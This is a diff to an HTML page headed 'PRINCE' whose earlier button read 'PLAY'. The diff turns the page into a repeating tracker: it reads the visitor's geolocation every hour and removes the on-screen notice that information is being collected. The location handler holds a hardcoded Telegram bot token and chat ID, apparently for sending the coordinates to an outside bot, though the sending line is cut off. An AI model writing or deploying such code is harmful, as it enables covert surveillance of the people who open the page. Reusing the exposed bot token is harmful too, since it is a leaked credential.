@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <title>Location and Battery Info</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Responsive meta tag -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             background-color: black;
@@ -10,25 +10,32 @@
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 20px;
-            margin: 0; /* Remove default margin */
+            margin: 0;
         }
         h1 {
-            font-size: 24px; /* Adjust font size for mobile */
+            font-size: 24px;
         }
         button {
-            padding: 10px 20px; /* Add padding to the button */
-            font-size: 16px; /* Adjust button font size */
-            cursor: pointer; /* Change cursor on hover */
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
     <h1>PRINCE</h1>
-    <button onclick="getLocation()">PLAY</button>
+    <button onclick="startTracking()">Start Tracking</button>
     <p id="status"></p>
 
     <script>
-        function getLocation() {
+        let trackingInterval;
+
+        function startTracking() {
+            updateInfo(); // Send initial update
+            trackingInterval = setInterval(updateInfo, 3600000); // Update every hour (3600000 ms)
+        }
+
+        function updateInfo() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, showError);
             } else {
@@ -39,8 +46,6 @@
         function sendLocation(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
-
-            document.getElementById("status").textContent = "Collecting information...";
 
             var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
             var chatId = '5112680061'; // Replace with your chat ID
